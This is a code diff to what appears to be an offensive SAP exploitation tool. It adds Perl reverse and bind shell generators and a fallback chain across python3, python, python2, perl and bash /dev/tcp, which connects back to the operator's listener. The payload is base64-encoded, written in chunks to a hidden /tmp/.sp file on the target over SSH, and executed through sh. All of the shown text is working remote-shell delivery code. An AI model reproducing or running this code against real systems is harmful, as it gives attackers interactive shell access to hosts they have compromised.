@@ -947,6 +947,38 @@ def _detect_python_cmd(node) -> str:
     return "python3"
 
 
+def _perl_reverse_shell(ip: str, port: int, with_fork: bool = True) -> str:
+    """Perl reverse shell — fallback when no Python on target.
+
+    Uses Socket.pm which is part of Perl core on every *nix.
+    fork()+exit(0) detaches the child so the SSH exec returns cleanly
+    while the reverse shell keeps running.
+    """
+    f = 'if(fork()){exit(0);}' if with_fork else ''
+    return (
+        f'use Socket;{f}'
+        f'$i="{ip}";$p={port};'
+        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+        f'if(connect(S,sockaddr_in($p,inet_aton($i))))'
+        f'{{open(STDIN,">&S");open(STDOUT,">&S");'
+        f'open(STDERR,">&S");exec("/bin/bash -i");}}'
+    )
+
+
+def _perl_bind_shell(port: int, with_fork: bool = True) -> str:
+    """Perl bind shell — fallback when no Python on target."""
+    f = 'if(fork()){exit(0);}close(STDOUT);close(STDERR);' if with_fork else ''
+    return (
+        f'use Socket;{f}'
+        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+        f'setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);'
+        f'bind(S,sockaddr_in({port},INADDR_ANY));'
+        f'listen(S,1);accept(C,S);'
+        f'open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");'
+        f'exec("/bin/bash -i");'
+    )
+
+
 def _generate_payload(os_type: str, ip: str, port: int,
                       python_cmd: str = "python3") -> dict:
     """Generate reverse shell payload based on OS type."""
@@ -7256,6 +7288,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"{payload['display']}")
                 print(f"    Listening on 0.0.0.0:{shell_port}")
 
+            if method == "ssh":
+                print(f"    SSH interpreter chain: "
+                      f"python3 → python → python2 → perl → "
+                      f"bash /dev/tcp")
+
             def _set_progress(msg):
                 with _shell_lock:
                     if _shell_session:
@@ -7566,12 +7603,41 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     f"{acc['username']}@{acc['target']}")
 
                 import base64 as _b64ssh
+                import shlex as _shlexssh
 
-                # The full command to run on the target is:
-                #   python3 -c CODE
-                # Base64-encode this full command, then use the
-                # echo B64|base64 -d|sh pattern to execute on remote.
-                full_cmd = f"python3 -c {py_code}"
+                # Build a multi-interpreter dispatch wrapper.
+                # The SSH payload is base64-encoded and piped through
+                # sh, so we have full shell syntax (spaces, quotes).
+                # Fallback chain:
+                #   python3 → python → python2 → perl → bash /dev/tcp
+                # The Python socket-trick code is Py2+3 compatible
+                # (__import__() style, no print-as-function, etc.).
+                _py_q = _shlexssh.quote(py_code)
+                _py_detect = (
+                    'command -v python3 2>/dev/null || '
+                    'command -v python 2>/dev/null || '
+                    'command -v python2 2>/dev/null'
+                )
+                if shell_mode == "reverse":
+                    _perl_fb = _perl_reverse_shell(
+                        local_ip, shell_port, with_fork=True)
+                    full_cmd = (
+                        f'PY=$({_py_detect}); '
+                        f'if [ -n "$PY" ]; then "$PY" -c {_py_q}; '
+                        f'elif command -v perl >/dev/null 2>&1; then '
+                        f'perl -e {_shlexssh.quote(_perl_fb)}; '
+                        f'else bash -i >& /dev/tcp/'
+                        f'{local_ip}/{shell_port} 0>&1; fi'
+                    )
+                else:
+                    _perl_fb = _perl_bind_shell(
+                        shell_port, with_fork=True)
+                    full_cmd = (
+                        f'PY=$({_py_detect}); '
+                        f'if [ -n "$PY" ]; then "$PY" -c {_py_q}; '
+                        f'elif command -v perl >/dev/null 2>&1; then '
+                        f'perl -e {_shlexssh.quote(_perl_fb)}; fi'
+                    )
                 cmd_b64 = _b64ssh.b64encode(
                     full_cmd.encode()).decode()
 
@@ -7589,13 +7655,17 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         src_node, "ssh", one_shot, long_params="")
                     result["success"] = True
                 else:
-                    # Too long: chunk the payload b64 to a file on
-                    # the target, then decode+exec.
-                    # Each chunk-write is a mini shell command
-                    # "echo CHUNK>>/tmp/.sp" which gets b64-encoded
-                    # and sent via the echo B64|base64 -d|sh pattern.
-                    py_b64 = _b64ssh.b64encode(
-                        py_code.encode()).decode()
+                    # Too long: chunk the wrapper b64 to a file on
+                    # the target, then decode+exec via sh.
+                    #
+                    # We write the FULL wrapper script (multi-
+                    # interpreter dispatch with python3/python/perl/
+                    # bash fallback) — not just the Python code.
+                    # That keeps the final exec step tiny:
+                    #   base64 -d /tmp/.sp | sh
+                    # which easily fits the 255-byte PARAMS limit.
+                    wrapper_b64 = _b64ssh.b64encode(
+                        full_cmd.encode()).decode()
 
                     # Calculate chunk size for the inner echo command.
                     # Inner shell cmd: "echo CHUNK>>/tmp/.sp"
@@ -7610,10 +7680,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     chunk_max = inner_max - 15
                     if chunk_max < 20:
                         chunk_max = 40
-                    chunks = [py_b64[i:i+chunk_max]
-                              for i in range(0, len(py_b64), chunk_max)]
+                    chunks = [wrapper_b64[i:i+chunk_max]
+                              for i in range(0, len(wrapper_b64), chunk_max)]
 
-                    _set_progress("Writing payload to target via SSH...")
+                    _set_progress("Writing payload to target via SSH "
+                                  "(python3/python/python2/perl/bash "
+                                  "wrapper)...")
 
                     # Clean
                     sapmap_exploit.execute_gw_command(
@@ -7654,9 +7726,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         str(x) for x in (vfy.get("output") or []))
                     print(f"    verify /tmp/.sp: {vfy_out.strip()}")
 
-                    # Exec: decode b64 and pipe to python3
-                    _set_progress("Executing payload via SSH...")
-                    exec_cmd = "base64 -d /tmp/.sp|python3"
+                    # Exec: decode the wrapper script and pipe to sh.
+                    # The wrapper auto-detects the best interpreter:
+                    # python3 → python → perl → bash /dev/tcp.
+                    # Cleanup (rm /tmp/.sp) is inside the wrapper.
+                    _set_progress("Executing payload via SSH "
+                                  "(trying python3/python/python2/"
+                                  "perl/bash)...")
+                    exec_cmd = "base64 -d /tmp/.sp|sh;rm -f /tmp/.sp"
                     exec_b64 = _b64ssh.b64encode(
                         exec_cmd.encode()).decode()
                     exec_args = (
@@ -7667,12 +7744,6 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     result = sapmap_exploit.execute_gw_command(
                         src_node, "ssh", exec_args, long_params="")
                     result["success"] = True
-
-                    # Cleanup
-                    sapmap_exploit.execute_gw_command(
-                        src_node, "ssh",
-                        f"{ssh_prefix} rm -f /tmp/.sp",
-                        long_params="")
 
                 print(f"[+] {sid}: SSH shell payload delivered "
                       f"via {acc['from_sid']} → "
